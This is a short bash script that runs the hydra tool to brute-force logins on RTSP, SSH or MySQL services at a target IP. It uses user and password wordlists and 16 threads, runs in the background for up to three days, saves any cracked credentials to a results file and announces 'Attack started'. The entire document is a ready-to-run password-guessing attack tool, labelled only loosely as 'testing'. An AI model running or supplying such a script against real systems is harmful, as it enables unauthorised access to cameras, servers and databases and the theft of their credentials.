#!/bin/bash
# Parallel brute force framework for RTSP/SSH/MySQL testing
# Usage: ./hydra_parallel.sh <target_ip> <port> <protocol> <wordlist>

TARGET_IP=${1:-"example_target"}
PORT=${2:-554}
PROTOCOL=${3:-rtsp}
WORDLIST=${4:-"telecom_patterns.txt"}
THREADS=${5:-16}

USERLIST="users.txt"

if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist not found: $WORDLIST"
    exit 1
fi

if [ ! -f "$USERLIST" ]; then
    echo "[!] Userlist not found: $USERLIST"
    exit 1
fi

echo "[*] Starting parallel brute force"
echo "[*] Target: $TARGET_IP:$PORT ($PROTOCOL)"
echo "[*] Threads: $THREADS"

timeout 259200 hydra -L "$USERLIST" -P "$WORDLIST" -t "$THREADS" -W 1 -s "$PORT" "$TARGET_IP" "$PROTOCOL" -o results.txt -I > brute_force.log 2>&1 &

echo "[+] Attack started (PID: $!)"
echo "[+] Monitor progress with: tail -f brute_force.log"
